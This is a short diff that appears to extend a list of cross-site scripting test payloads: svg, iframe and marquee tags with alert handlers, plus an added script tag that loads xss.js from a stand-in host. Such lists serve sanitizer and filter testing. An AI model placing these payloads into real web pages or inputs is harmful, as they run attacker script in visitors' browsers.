@@ -5,3 +5,4 @@
 <svg/onload=alert('XSS')>
 <iframe src='http://test.test'></iframe>
 <marquee onstart=alert('XSS')>
+<script src="http://test.test/xss.js"></script>
